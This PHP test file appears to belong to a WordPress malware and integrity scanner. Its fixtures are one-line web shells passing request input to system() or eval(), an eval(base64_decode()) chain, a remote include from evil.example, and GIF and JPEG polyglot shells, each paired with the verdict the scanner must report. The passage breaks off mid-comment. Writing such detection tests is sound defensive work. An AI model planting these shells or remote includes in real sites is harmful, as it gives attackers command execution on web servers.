<?php
declare(strict_types=1);

namespace Tests;

use Ovos\Codesafe\Config;
use Ovos\Codesafe\Database;
use Ovos\Codesafe\Scan as PluginScan;
use Ovos\Codesafe\Shield\Prepend;
use Ovos\Test;
use Ovos\Test\Internal;
use RuntimeException;

use function array_column;
use function array_count_values;
use function array_filter;
use function array_keys;
use function array_map;
use function array_sum;
use function array_values;
use function count;
use function dirname;
use function end;
use function explode;
use function file_get_contents;
use function file_put_contents;
use function hash;
use function implode;
use function in_array;
use function is_array;
use function is_dir;
use function md5;
use function mkdir;
use function pack;
use function preg_match;
use function range;
use function realpath;
use function rmdir;
use function scandir;
use function serialize;
use function str_contains;
use function str_ends_with;
use function str_pad;
use function str_repeat;
use function str_replace;
use function str_starts_with;
use function substr;
use function sys_get_temp_dir;
use function time;
use function touch;
use function uniqid;
use function unlink;
use function usleep;
use function wp_shim_reset;

use const DIRECTORY_SEPARATOR;
use const FILE_APPEND;
use const STR_PAD_LEFT;

require_once __DIR__ . DIRECTORY_SEPARATOR . 'files' . DIRECTORY_SEPARATOR . 'wordpress.file.php';

/**
 * The integrity scan without WordPress: whether a file is a "silence is
 * golden" stub and whether a media file's head holds PHP that could run, each
 * as PHP itself would read the bytes; and the wp-content walk over a temp
 * WordPress-shaped tree, the plugin's own store in it.
 *
 * @author Marcin Gil <mg@ovos.at>
 */
class Scan extends Test
{
	protected string $root;
	
	/** @var array<string, string> */
	protected array $roots;
	
	#[Internal]
	public function prepare(): void
	{
		wp_shim_reset();
		
		$base = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'ovos-scan-' . uniqid();
		mkdir($base, 0700, true);
		$this->root = str_replace('\\', '/', (string)realpath($base));
		$this->roots = [
			'root' => $this->root,
			'content' => $this->root . '/wp-content',
			'plugins' => $this->root . '/wp-content/plugins',
			'mu' => $this->root . '/wp-content/mu-plugins',
			'themes' => $this->root . '/wp-content/themes',
			'uploads' => $this->root . '/wp-content/uploads',
		];
		
		foreach($this->roots as $dir)
		{
			if(is_dir($dir) === false)
			{
				mkdir($dir, 0700, true);
			}
		}
	}
	
	#[Internal]
	public function finalize(): void
	{
		$this->remove($this->root);
	}
	
	protected function remove(
		string $path,
	): void
	{
		if(is_dir($path) === false)
		{
			return;
		}
		foreach((array)scandir($path) as $entry)
		{
			if($entry === '.' || $entry === '..')
			{
				continue;
			}
			$child = $path . '/' . $entry;
			is_dir($child) ? $this->remove($child) : unlink($child);
		}
		rmdir($path);
	}
	
	/**
	 * A scan of the temp tree with the store where $store says
	 *
	 * @param array{store: string, stub: string, legacy: string} $store
	 * @param array<string, string> $versions plugin directory => version, for the checksum lists
	 * @param array<string, int> $limits walk bounds lowered for the test, by name
	 */
	protected function scanner(
		array $store,
		array $versions = [],
		array $limits = [],
	): PluginScan
	{
		return new class(new Config, $this->roots, $store, $versions, $limits) extends PluginScan
		{
			public function __construct(
				Config $config,
				protected array $tree,
				protected array $own,
				protected array $versions,
				protected array $limits,
			)
			{
				parent::__construct($config);
			}
			
			public function roots(): array
			{
				return $this->tree;
			}
			
			public function pluginVersions(): array
			{
				return $this->versions;
			}
			
			protected function storePaths(): array
			{
				return $this->own;
			}
			
			protected function limit(
				string $name,
			): int
			{
				return $this->limits[$name] ?? parent::limit($name);
			}
		};
	}
	
	/**
	 * The phases of $areas from a fresh manual pass over the temp tree, with
	 * no core list, so nothing is fetched
	 *
	 * @param array{store: string, stub: string, legacy: string} $store
	 * @param list<string> $areas
	 * @param array<string, string> $versions plugin directory => version, for the checksum lists
	 * @param array<string, int> $limits walk bounds lowered for the test, by name
	 * @param array<string, mixed> $resume where the last pass's bounded walks stopped (its resume_next)
	 */
	protected function walk(
		array $store,
		array $areas = ['content'],
		array $versions = [],
		array $limits = [],
		array $resume = [],
	): array
	{
		$scan = $this->scanner($store, $versions, $limits);
		$state = $scan->start('manual', $resume);
		$state['phases'] = array_values(array_filter($state['phases'], static fn(array $phase): bool => in_array($phase[0], $areas, true)));
		$state['checksums']['core'] = 'unavailable';
		
		return $scan->advance($state, 10_000);
	}
	
	/** a store nowhere in the tree, for the walks that do not look at it */
	protected function noStore(): array
	{
		return ['store' => $this->root . '/elsewhere', 'stub' => $this->root . '/elsewhere', 'legacy' => $this->root . '/elsewhere'];
	}
	
	/**
	 * The finding the walk reported for a path under wp-content, as
	 * "detector tier", '' when there is none
	 */
	protected function verdict(
		array $state,
		string $path,
	): string
	{
		foreach($state['findings'] as $finding)
		{
			if($finding['path'] === $path)
			{
				return $finding['detector'] . ' ' . $finding['tier'];
			}
		}
		
		return '';
	}
	
	/** the detail of the walk's finding for a path, '' when there is none */
	protected function detail(
		array $state,
		string $path,
	): string
	{
		foreach($state['findings'] as $finding)
		{
			if($finding['path'] === $path)
			{
				return $finding['detail'] ?? '';
			}
		}
		
		return '';
	}
	
	protected function write(
		string $path,
		string $content,
	): void
	{
		if(is_dir(dirname($path)) === false)
		{
			mkdir(dirname($path), 0700, true);
		}
		file_put_contents($path, $content);
	}
	
	/**
	 * RULE: the plugin's own store reads as what the plugin writes there — the
	 * stub beside the data under both of its names (codesafe-shield.php, and
	 * the prepend.php a configuration may still name), the legacy
	 * directory's stub, the stubs naming a moved data directory, the data
	 * files and the mu-plugin are silent and counted verified. One byte appended to the stub or the mu-plugin is
	 * URGENT (both run on every request), a data file without its guard is
	 * HIGH, a stranger in the store stays content_php HIGH. Falsify: know the
	 * stub by one name only (the other reads as a stranger); judge the
	 * stub by its marker as ensureStub() keeps it (the appended byte passes);
	 * expect `__DIR__` wherever a stub stands (the moved store's stub reads
	 * as modified); trust the whole store (the stranger passes).
	 */
	public function thePluginsOwnStoreIsVerifiedByteForByte(): bool
	{
		$content = $this->roots['content'];
		$own = ['store' => $content . '/ovos-codesafe', 'stub' => $content . '/ovos-codesafe', 'legacy' => $content . '/ovos-console'];
		$consent = ['detect' => true, 'enforce' => true, 'kill' => false, 'prefix' => '', 'root' => $this->root, 'entries' => true];
		
		mkdir($own['store'], 0700, true);
		mkdir($own['legacy'], 0700, true);
		Prepend::ensureStub($own['store']);
		Prepend::ensureStub($own['store'], $own['store'] . '/' . Prepend::STUB_OLD);
		Prepend::ensureStub($own['store'], $own['legacy'] . '/prepend.php');
		Prepend::writeConsent($own['store'], $consent);
		Prepend::writeKnown($own['store'], '7.1.3', '1.0.1', ['wp-admin/admin-ajax.php' => 'core']);
		Prepend::ensureMuPlugin($own['store'], $this->roots['mu']);
		$this->write($own['store'] . '/index.php', "<?php\n// silence is golden\n");
		
		$clean = $this->walk($own);
		
		// the data moved by CODESAFE_STORE_DIR: the stub stays and names the new directory
		$moved = ['store' => $content . '/private/store', 'stub' => $own['stub'], 'legacy' => $own['legacy']];
		mkdir($moved['store'], 0700, true);
		Prepend::ensureStub($moved['store'], $own['stub'] . '/' . Prepend::STUB);
		Prepend::ensureStub($moved['store'], $own['stub'] . '/' . Prepend::STUB_OLD);
		Prepend::writeConsent($moved['store'], $consent);
		unlink($own['store'] . '/' . Prepend::CONSENT);
		unlink($own['store'] . '/' . Prepend::ENTRIES);
		unlink($this->roots['mu'] . '/' . Prepend::MU_PLUGIN);
		Prepend::ensureMuPlugin($moved['store'], $this->roots['mu']);
		
		$relocated = $this->walk($moved);
		
		file_put_contents($own['stub'] . '/' . Prepend::STUB, "\nsystem(\$_GET['c']);\n", FILE_APPEND);
		file_put_contents($own['stub'] . '/' . Prepend::STUB_OLD, "\nsystem(\$_GET['c']);\n", FILE_APPEND);
		file_put_contents($this->roots['mu'] . '/' . Prepend::MU_PLUGIN, "\n// x\n", FILE_APPEND);
		$this->write($moved['store'] . '/' . Prepend::CONSENT, (string)file_get_contents($moved['store'] . '/' . Prepend::CONSENT, offset: 15));
		$this->write($moved['store'] . '/x.php', "<?php system(\$_GET['c']);");
		
		$tampered = $this->walk($moved);
		
		return $this->verdict($clean, 'ovos-codesafe/codesafe-shield.php') === ''
			&& $this->verdict($clean, 'ovos-codesafe/prepend.php') === ''
			&& $this->verdict($clean, 'ovos-console/prepend.php') === ''
			&& $this->verdict($clean, 'ovos-codesafe/' . Prepend::CONSENT) === ''
			&& $this->verdict($clean, 'ovos-codesafe/' . Prepend::ENTRIES) === ''
			&& $this->verdict($clean, 'ovos-codesafe/index.php') === ''
			&& $this->verdict($clean, 'mu-plugins/' . Prepend::MU_PLUGIN) === ''
			&& $clean['areas']['content']['verified'] === 6
			&& $this->verdict($relocated, 'ovos-codesafe/codesafe-shield.php') === ''
			&& $this->verdict($relocated, 'ovos-codesafe/prepend.php') === ''
			&& $this->verdict($relocated, 'private/store/' . Prepend::CONSENT) === ''
			&& $this->verdict($relocated, 'mu-plugins/' . Prepend::MU_PLUGIN) === ''
			&& $this->verdict($tampered, 'ovos-codesafe/codesafe-shield.php') === 'store_modified urgent'
			&& $this->verdict($tampered, 'ovos-codesafe/prepend.php') === 'store_modified urgent'
			&& $this->verdict($tampered, 'mu-plugins/' . Prepend::MU_PLUGIN) === 'store_modified urgent'
			&& $this->verdict($tampered, 'private/store/' . Prepend::CONSENT) === 'store_modified high'
			&& $this->verdict($tampered, 'private/store/x.php') === 'content_php high';
	}
	
	/**
	 * RULE: a stub is what the tokenizer reads as an opener, comments and
	 * whitespace, and an optional closer — a `//` comment ended by a bare CR,
	 * a closer inside a comment followed by HTML, and a `#[` attribute line
	 * are code; the core form, a block comment with CR line ends and a closer
	 * at the end are stubs. Without the tokenizer the strict pattern rejects
	 * all four bypasses and the `#` form too. Falsify: the old pattern
	 * (`(?://|#)[^\n]*`) — every bypass passes as a stub and goes unreported.
	 */
	public function aStubIsWhatTheTokenizerSaysItIs(): bool
	{
		$bypasses = [
			"<?php\r// Silence\rsystem(\$_GET['c']);\r",
			"<?php // x ?><script>alert(1)</script>",
			"<?php\n#[A] function f(){system('id');} f();\n",
			"<?php\n// fine\n?>\n<?php system('id');",
		];
		$stubs = [
			"<?php\n// Silence is golden.\n",
			"<?php\r/*Silence is Golden*/\r?>",
			"<?php // x ?>\n",
			"\n<?php\n/** nothing */\n?>\n\n",
			'<?php',
		];
		
		foreach($bypasses as $source)
		{
			if(PluginScan::stubShaped($source) || PluginScan::stubShaped($source, tokenizer: false))
			{
				return false;
			}
		}
		
		foreach($stubs as $source)
		{
			if(PluginScan::stubShaped($source) === false || PluginScan::stubShaped($source, tokenizer: false) === false)
			{
				return false;
			}
		}
		
		// the strict fallback refuses a # line the tokenizer reads as a comment
		return PluginScan::stubShaped("<?php\n# Silence is golden.\n")
			&& PluginScan::stubShaped("<?php\n# Silence is golden.\n", tokenizer: false) === false
			&& PluginScan::stubShaped("<?= 'x';") === false
			&& PluginScan::stubShaped('silence') === false;
	}
	
	/**
	 * RULE: a media file holds PHP only where an opener's code up to its
	 * closer has no byte PHP refuses: the `<?=` inside a PNG's compressed
	 * data (followed by 0x03) is none, a GIF carrying `<?php system()`, an
	 * echo-tag backtick shell and an upper-case `<?PHP` are; `<?xml` and
	 * `<?phpinfo` open nothing. Without the tokenizer any opener counts.
	 * Falsify: the substring rule — the PNG is reported URGENT; a
	 * case-sensitive `<?php` — the upper-case shell passes.
	 */
	public function aCompressedImageIsNoPolyglot(): bool
	{
		$png = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00+\x00\x00\x00+\x08\x06\x00\x00\x00IDATx\x9c<?=\x03r\x16t\x1e\xff\x00\x10abc";
		$shells = [
			"GIF89a\x01\x00\x01\x00<?php system(\$_GET['c']); ?>\x00\x00;",
			"\xff\xd8\xff\xe0<?=`id`?>\xff\xd9",
			"\xff\xd8\xff\xe0<?PHP system('id');",
		];
		
		foreach($shells as $head)
		{
			if(PluginScan::opensPhp($head) === false || PluginScan::opensPhp($head, tokenizer: false) === false)
			{
				return false;
			}
		}
		
		return PluginScan::opensPhp($png) === false
			&& PluginScan::opensPhp($png, tokenizer: false)
			&& PluginScan::opensPhp('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>') === false
			&& PluginScan::opensPhp('<?phpinfo') === false
			&& PluginScan::opensPhp("\x89PNG\r\n\x1a\nIDAT\x00\x01") === false;
	}
	
	/**
	 * RULE: the Twig templates WPML compiles into uploads/cache/wpml/twig
	 * (its WPML_Cache_Directory, which WooCommerce Multilingual ships too)
	 * are listed as the owner's while a WPML plugin is installed: a compiled
	 * template that only declares its class and holds no code shape. The same
	 * file is URGENT with no owner, and so is one there that runs code when
	 * requested or carries no compiler's mark; one whose method hands request
	 * input to a runner is that shape. Falsify: trust the folder without its
	 * owner (the orphan is listed); trust the compiler's mark alone (the
	 * top-level write is listed); trust declarations alone (the unmarked
	 * function file is listed); skip the shapes (the method's shell is listed).
	 */
	public function wpmlsCompiledTemplatesUnderUploadsAreItsOwn(): bool
	{
		$twig = $this->roots['uploads'] . '/cache/wpml/twig';
		$hash = hash('sha256', '__TwigTemplate_language-switcher');
		// what WPML's bundled Twig 1.42 (WPML\Core\Twig\Node\ModuleNode) writes, abridged
		$head = "<?php\n\nnamespace WPML\\Core;\n\nuse \\WPML\\Core\\Twig\\Environment;\nuse \\WPML\\Core\\Twig\\Source;\nuse \\WPML\\Core\\Twig\\Template;\n\n"
			. "/* language-switcher.twig */\n";
		$class = "class __TwigTemplate_" . $hash . " extends \\WPML\\Core\\Twig\\Template\n{\n";
		$body = "    protected function doDisplay(array \$context, array \$blocks = [])\n    {\n        // line 1\n        echo \"<div class=\\\"wpml-ls\\\">\";\n"
			. "        echo \\WPML\\Core\\twig_escape_filter(\$this->env, (\$context[\"name\"] ?? null), \"html\", null, true);\n        echo \"</div>\";\n    }\n\n"
			. "    public function getTemplateName()\n    {\n        return \"language-switcher.twig\";\n    }\n}\n";
		$this->write($twig . '/' . substr($hash, 0, 2) . '/' . $hash . '.php', $head . $class . $body);
		$this->write($twig . '/cc/plain.php', "<?php\nfunction agency_x(): void\n{\n\techo 1;\n}\n");
		$this->write($twig . '/aa/run.php', $head . "file_put_contents(__DIR__ . '/x.php', 'y');\n" . $class . $body);
		$this->write($twig . '/bb/shell.php', $head . $class . "    public function getTemplateName()\n    {\n        return system(\$_GET['c']);\n    }\n}\n");
		mkdir($this->roots['plugins'] . '/woocommerce-multilingual', 0700, true);
		
		$owned = $this->walk($this->noStore(), ['uploads']);
		rmdir($this->roots['plugins'] . '/woocommerce-multilingual');
		$orphaned = $this->walk($this->noStore(), ['uploads']);
		$path = 'cache/wpml/twig/' . substr($hash, 0, 2) . '/' . $hash . '.php';
		
		return $this->verdict($owned, $path) === 'uploads_php_owned info'
			&& $this->detail($owned, $path) === 'owned by woocommerce-multilingual, a compiled template'
			&& $this->verdict($owned, 'cache/wpml/twig/aa/run.php') === 'uploads_php urgent'
			&& $this->verdict($owned, 'cache/wpml/twig/cc/plain.php') === 'uploads_php urgent'
			&& $this->verdict($owned, 'cache/wpml/twig/bb/shell.php') === 'request_exec urgent'
			&& $this->verdict($orphaned, $path) === 'uploads_php urgent';
	}
	
	/**
	 * RULE: an icon set's charmap.php under uploads/smile_fonts is listed as
	 * the owner's data while Ultimate Addons is installed, whatever the
	 * directory's casing; the same file is URGENT with no owner, and so is a
	 * charmap that calls anything. Falsify: allow `(` after any token (the
	 * variable call passes as data); look the owner up case-sensitively with
	 * the table's casing against a lower-case directory (the owner is missed).
	 */
	public function aWritersDataFileUnderUploadsIsListedNotUrgent(): bool
	{
		$uploads = $this->roots['uploads'];
		$charmap = "<?php \$icons = array();\n\$icons['icomoon']['icn_a'] = array(\"class\"=>\"icn_a\",\"tags\"=>\"a\",\"unicode\"=>\"\\e900\");\n";
		$this->write($uploads . '/smile_fonts/icomoon/charmap.php', $charmap);
		$this->write($uploads . '/smile_fonts/Defaults/charmap.php', "<?php \$icons = 'system'; \$icons('id');");
		mkdir($this->roots['plugins'] . '/ultimate_vc_addons', 0700, true);
		
		$owned = $this->walk($this->noStore(), ['uploads']);
		rmdir($this->roots['plugins'] . '/ultimate_vc_addons');
		$orphaned = $this->walk($this->noStore(), ['uploads']);
		
		return $this->verdict($owned, 'smile_fonts/icomoon/charmap.php') === 'uploads_php_owned info'
			// named as the directory is named, which a case-insensitive file system alone would not tell
			&& $this->detail($owned, 'smile_fonts/icomoon/charmap.php') === 'owned by ultimate_vc_addons, data only'
			&& $this->verdict($owned, 'smile_fonts/Defaults/charmap.php') === 'uploads_php urgent'
			&& $this->verdict($orphaned, 'smile_fonts/icomoon/charmap.php') === 'uploads_php urgent'
			&& PluginScan::dataOnly("<?php \$a = ['x' => true, 'y' => -1.5, 'z' => null];")
			&& PluginScan::dataOnly("<?php ('system')('id');") === false
			&& PluginScan::dataOnly("<?php \$a = [\$b, 'c'](); ") === false
			&& PluginScan::dataOnly("<?php \$a = \"{\$b()}\";") === false
			&& PluginScan::dataOnly("<?php \$a = 1; ?>\n<script>alert(1)</script>") === false;
	}
	
	/**
	 * RULE: PHP that stops before any code runs is listed, not reported as a
	 * stranger — AIOS's firewall settings behind __halt_compiler() under
	 * uploads, a W3 Total Cache config behind an exit in wp-content — while an
	 * exit that is conditional or runs an expression first stays URGENT.
	 * Falsify: accept an exit anywhere, or with any argument (the conditional
	 * and the exit(system()) pass as inert).
	 */
	public function anInertHeaderMakesAFileData(): bool
	{
		$uploads = $this->roots['uploads'];
		$this->write($uploads . '/aios/firewall-rules/settings.php', "<?php __halt_compiler();// AIOS\n{\"aiowps_googlebot_ip_ranges\":[]}");
		$this->write($this->roots['content'] . '/w3tc-config-old/master.php', "<?php exit; ?>\n{\"version\":\"2.1\"}");
		$this->write($uploads . '/x/conditional.php', "<?php if(0) exit; system('id');");
		$this->write($uploads . '/x/argument.php', "<?php exit(system('id'));");
		$this->write($uploads . '/x/literal.php', "<?php\n// guard\ndie('No direct access');\nsystem('id');");
		
		$walked = $this->walk($this->noStore(), ['uploads', 'content']);
		
		return $this->verdict($walked, 'aios/firewall-rules/settings.php') === 'inert_php info'
			&& $this->verdict($walked, 'w3tc-config-old/master.php') === 'inert_php info'
			&& $this->verdict($walked, 'x/conditional.php') === 'uploads_php urgent'
			&& $this->verdict($walked, 'x/argument.php') === 'uploads_php urgent'
			&& $this->verdict($walked, 'x/literal.php') === 'inert_php info'
			&& PluginScan::inert("<?php exit(); ?>")
			&& PluginScan::inert("<?php echo 1; exit;") === false
			&& PluginScan::inert("<?= 1; exit;") === false;
	}
	
	/**
	 * RULE: a plugin file whose md5 is the second of the two its wordpress.org
	 * list names is verified, neither foreign nor modified. Falsify: keep
	 * only string md5s in the list (the file is foreign) or compare against
	 * one md5 (the file is modified).
	 */
	public function aFileShippedUnderAnyOfItsListedHashesIsVerified(): bool
	{
		$source = "<?php // demo\n";
		$this->write($this->roots['plugins'] . '/demo/demo.php', $source);
		$GLOBALS['wp']['api'] = ['files' => ['demo.php' => ['md5' => [md5('an earlier cut'), md5($source)]]]];
		
		$walked = $this->walk($this->noStore(), ['plugins'], ['demo' => '1.0']);
		
		return $this->verdict($walked, 'demo/demo.php') === ''
			&& $walked['areas']['plugins']['verified'] === 1
			&& $walked['areas']['plugins']['foreign'] === 0
			&& $walked['areas']['plugins']['modified'] === 0;
	}
	
	/**
	 * RULE: the database phase runs only on a request that reached wp_loaded —
	 * at once on a WP-Cron or admin one, on any other only after a day of
	 * waiting for one — and a pass that waits stays where it was. A manual
	 * pass is judged by the request too: a visitor's request that finishes it
	 * waits like any other, the button's own admin request runs it.
	 * Falsify: drop the wp_loaded gate (an early-exiting request judges cron
	 * listeners it never loaded); drop the day's fallback (a site without
	 * cron or admin requests never finishes its pass); let a manual pass run
	 * it anywhere (a visitor's request lists every listener an admin-only
	 * plugin skips as an orphan).
	 */
	public function theDatabasePhaseWaitsForALoadedRequest(): bool
	{
		$scan = $this->scanner($this->noStore());
		$fresh = static function(string $mode) use ($scan): array
		{
			$state = $scan->start($mode);
			$state['phases'] = [[Database::AREA, '', false, []]];
			
			return $state;
		};
		
		$early = $scan->advance($fresh('background'), 1000);
		
		$GLOBALS['wp']['did']['wp_loaded'] = 1;
		$frontEnd = $scan->advance($early, 1000);
		$frontEnd['database_deferred_since'] = time() - 86400;
		$aDayLater = $scan->advance($frontEnd, 1000);
		$visitor = $scan->advance($fresh('manual'), 1000);
		
		$GLOBALS['wp']['admin'] = true;
		$button = $scan->advance($fresh('manual'), 1000);
		$GLOBALS['wp']['admin'] = false;
		
		$GLOBALS['wp']['doing_cron'] = true;
		$cron = $scan->advance($fresh('background'), 1000);
		
		return $early['phase'] === 0 && $early['done'] === false && isset($early['database_deferred_since']) === false
			&& $frontEnd['phase'] === 0 && $frontEnd['done'] === false && isset($frontEnd['database_deferred_since'])
			&& $aDayLater['done'] === true
			&& $visitor['done'] === false && isset($visitor['database_deferred_since'])
			&& $button['done'] === true
			&& $cron['done'] === true;
	}
	
	/**
	 * RULE: a deferral dated ahead of the clock was planted in the stored
	 * pass, never written by a request: the day's wait starts at this one, so
	 * the phase still runs a day later. A date a few seconds ahead, another
	 * server's clock, is kept.
	 * Falsify: keep the planted date — a site without cron or admin requests
	 * never finishes its pass.
	 */
	public function aDeferralFromTheFutureWaitsFromNow(): bool
	{
		$scan = $this->scanner($this->noStore());
		$state = $scan->start('background');
		$state['phases'] = [[Database::AREA, '', false, []]];
		$GLOBALS['wp']['did']['wp_loaded'] = 1;
		
		$soon = time() + 3;
		$state['database_deferred_since'] = $soon;
		$skewed = $scan->advance($state, 1000);
		$state['database_deferred_since'] = time() + 315_360_000;
		$planted = $scan->advance($state, 1000);
		$restarted = (int)($planted['database_deferred_since'] ?? 0);
		$planted['database_deferred_since'] = $restarted - 86400;
		$aDayLater = $scan->advance($planted, 1000);
		
		return $skewed['done'] === false && $skewed['database_deferred_since'] === $soon
			&& $planted['done'] === false
			&& $restarted <= time() && $restarted > time() - 60
			&& $aDayLater['done'] === true;
	}
	
	/**
	 * RULE: the bootstrap AIOS writes into the document root is its own while
	 * AIOS is installed, and a stranger once it is not. Falsify: drop the
	 * ROOT_OWNERS entry — the root file is URGENT on every AIOS site.
	 */
	public function aRootFileAiosWritesIsOwned(): bool
	{
		$this->write($this->root . '/aios-bootstrap.php', "<?php\n// Begin AIOWPSEC Firewall\n\$GLOBALS['aiowps_firewall_rules_path'] = '/x';\n");
		mkdir($this->roots['plugins'] . '/all-in-one-wp-security-and-firewall', 0700, true);
		
		$owned = $this->walk($this->noStore(), ['root']);
		rmdir($this->roots['plugins'] . '/all-in-one-wp-security-and-firewall');
		$stranger = $this->walk($this->noStore(), ['root']);
		
		return $this->verdict($owned, 'aios-bootstrap.php') === 'root_php_owned info'
			&& $this->verdict($stranger, 'aios-bootstrap.php') === 'root_php urgent';
	}
	
	/**
	 * RULE: on a network the plugins activated network-wide are active —
	 * read from the network's options, where activate_plugin() writes them —
	 * beside the site's own; a single site never loads that row, so a stale
	 * one there counts for nothing. Falsify: read it with get_option() — the
	 * network-active plugin is invisible; drop the multisite test — a single
	 * site's stale row reads as active.
	 */
	public function networkActivePluginsCountAsActive(): bool
	{
		$GLOBALS['wp']['multisite'] = true;
		$GLOBALS['wp']['site_options']['active_sitewide_plugins'] = ['wordfence/wordfence.php' => 1];
		$GLOBALS['wp']['options']['active_plugins'] = ['akismet/akismet.php', 'hello.php'];
		$network = $this->scanner($this->noStore())->activeSlugs();
		$GLOBALS['wp']['multisite'] = false;
		$GLOBALS['wp']['options']['active_sitewide_plugins'] = ['wordfence/wordfence.php' => 1];
		$single = $this->scanner($this->noStore())->activeSlugs();
		
		return $network === ['akismet', 'hello', 'wordfence']
			&& $single === ['akismet', 'hello'];
	}
	
	/**
	 * RULE: what runs anywhere on a network is every site's active plugins
	 * and its stylesheet and template options, each name once; a network of
	 * more sites than SITES_MAX cannot be read at a bounded cost and answers
	 * null; a single site reads its own options and never asks for sites.
	 * Falsify: ask for SITES_MAX sites — 101 read like 100; read the
	 * stylesheet alone — a parent theme reads as not run.
	 */
	public function activeAnywhereReadsEverySiteUpToTheCap(): bool
	{
		$GLOBALS['wp']['multisite'] = true;
		$GLOBALS['wp']['options']['stylesheet'] = 'own';
		$GLOBALS['wp']['options']['template'] = 'own';
		$GLOBALS['wp']['sites'] = [1, 2, 3];
		$GLOBALS['wp']['blog_options'] = [
			2 => ['active_plugins' => ['akismet/akismet.php']],
			3 => ['stylesheet' => 'child', 'template' => 'parent'],
		];
		$scan = $this->scanner($this->noStore());
		$network = $scan->activeAnywhere();
		$asked = $GLOBALS['wp']['sites_asked'][0]['number'] ?? 0;
		$GLOBALS['wp']['sites'] = range(1, PluginScan::SITES_MAX + 1);
		$past = $scan->activeAnywhere();
		$GLOBALS['wp']['sites'] = range(1, PluginScan::SITES_MAX);
		$at = $scan->activeAnywhere();
		$GLOBALS['wp']['multisite'] = false;
		$GLOBALS['wp']['sites_asked'] = [];
		$single = $scan->activeAnywhere();
		
		return $network === ['plugins' => ['akismet'], 'themes' => ['own', 'child', 'parent']]
			&& $asked === PluginScan::SITES_MAX + 1
			&& $past === null
			&& $at !== null
			&& $single === ['plugins' => [], 'themes' => ['own']]
			&& $GLOBALS['wp']['sites_asked'] === [];
	}
	
	/** every finding the walk reported for a path, as "detector tier" */
	protected function verdicts(
		array $state,
		string $path,
	): array
	{
		$found = [];
		
		foreach($state['findings'] as $finding)
		{
			if($finding['path'] === $path)
			{
				$found[] = $finding['detector'] . ' ' . $finding['tier'];
			}
		}
		
		return $found;
	}
	
	/** the line of the walk's first finding for a path, 0 when it has none */
	protected function line(
		array $state,
		string $path,
	): int
	{
		foreach($state['findings'] as $finding)
		{
			if($finding['path'] === $path)
			{
				return (int)($finding['line'] ?? 0);
			}
		}
		
		return 0;
	}
	
	/** whether scan.skipped names a path that starts with $prefix */
	protected function skippedUnder(
		array $state,
		string $prefix,
	): bool
	{
		foreach($state['skipped'] as $skipped)
		{
			if(str_starts_with($skipped, $prefix))
			{
				return true;
			}
		}
		
		return false;
	}
	
	/**
	 * The backdoors a package carries in the wild by their path inside it,
	 * each with the verdict it must draw, and the honest files beside them
	 * that must draw none
	 *
	 * @return array{0: array<string, array{0: string, 1: string}>, 1: array<string, string>}
	 */
	protected function plantedAndHonest(): array
	{
		$planted = [
			'functions.php' => ["<?php\n// setup\n@eval(base64_decode('ZWNobyAxOw=='));\n", 'eval_chain high'],
			'inc/helpers.php' => ["<?php\nfunction helper(): int { return 1; }\nif(isset(\$_POST['k'])) { eval(\$_POST['k']); }\n", 'request_exec urgent'],
			'inc/cmd.php' => ["<?php \$_REQUEST['f'](\$_REQUEST['a']);", 'request_exec urgent'],
			'inc/shell.php' => ["<?php\necho '<pre>';\nsystem(\$_GET['c']);\n", 'request_exec urgent'],
			'inc/loader.php' => ["<?php\n@include \"\\057tmp\\057.sess_a1b2.ico\";\n", 'include_foreign urgent'],
			'inc/remote.php' => ["<?php require_once 'https://evil.example/x.txt';", 'include_foreign urgent'],
			'assets/images/logo.php' => ["<?php echo 'x'; file_put_contents('a', 'b');", 'asset_php high'],
			'wp-login.php' => ["<?php echo 'login';", 'mimic_core high'],
		];
		$honest = [
			'build/index.asset.php' => "<?php return array('dependencies' => array('wp-blocks'), 'version' => 'abc123');",
			'build/index.js' => 'wp.blocks.registerBlockType();',
			'languages/agency-de_DE.l10n.php' => "<?php\nreturn ['project-id-version' => 'Agency', 'messages' => ['a' => 'b']];\n",
			'languages/agency-de_DE.mo' => "\xde\x12\x04\x95",
			'languages/agency-de_DE.po' => 'msgid ""',
			// the i18n tools' table of a script's strings: translation calls over literals
			'languages/agency-strings.php' => "<?php\n\$generated_i18n_strings = array(\n\t__('Save', 'agency'),\n\t_n('%d item', '%d items', 2, 'agency'),\n);\n",
			'assets/images/index.php' => "<?php // Silence is golden.",
			'assets/images/logo.png' => "\x89PNG\r\n\x1a\n",
			'assets/css/settings.php' => "<?php\ndefined('ABSPATH') || exit;\nreturn array('color' => '#fff');\n",
			// a stylesheet template that exits unless WordPress includes it, and helpers that only declare
			'assets/css/variables.php' => "<?php if(!defined('ABSPATH')) { exit; } ?>\n:root { --c: <?php echo esc_attr(\$color); ?>; }\n",
			'assets/css/functions.php' => "<?php\nfunction agency_css_lum(array \$args): string\n{\n\treturn implode(',', \$args);\n}\n",
			// styles a theme prints from a hook: requested by URL it stops at add_action(), WordPress not loaded
			'assets/css/dynamic-css.php' => "<?php\nfunction agency_dynamic_css(): void\n{\n\techo '<style>body{}</style>';\n}\nadd_action('wp_head', 'agency_dynamic_css');\n",
			'assets/css/style.css' => 'body{}',
			'assets/css/editor.css' => 'body{}',
			'assets/css/print.css' => 'body{}',
			// a folder's name is no proof: a PSR-4 namespace, a view's icons and a library's class file hold PHP alone
			'src/Css/Processor.php' => "<?php\nnamespace Agency\\Css;\nclass Processor\n{\n\tpublic function run(): string\n\t{\n\t\treturn 'a{}';\n\t}\n}\n",
			'views/icons/close.php' => "<svg viewBox=\"0 0 1 1\"><title><?php echo esc_html(\$label); ?></title></svg>\n",
			'inc/xmlrpc.php' => "<?php\nclass Agency_Xmlrpc\n{\n}\n",
			// a code sniffer's fixture writes the bad include it teaches against
			'vendor/sniffs/Tests/ruleset-test.inc' => "<?php\ninclude_once(\"http://www.example.com/bad_file.php\"); // Error.\n",
			'inc/template.php' => "<?php\nclass Template\n{\n\tpublic function assert(\$x)\n\t{\n\t\treturn \$this->assert(base64_decode(\$x));\n\t}\n}\n"
				. "\$data = base64_decode(\$_GET['d'] ?? '');\nrequire __DIR__ . '/parts/header.php';\ninclude get_template_directory() . '/assets/svg/icon.svg';\n"
				. "\$token = sanitize_text_field(wp_unslash(\$_POST['t'] ?? ''));\n"
				// request input handed to a named callback as its argument: the callable is the code's own
				. "call_user_func('agency_save', \$_POST['data'] ?? '');\n",
		];
		
		return [$planted, $honest];
	}
	
	/**
	 * RULE: a file no checksum list vouches for is read for what a backdoor
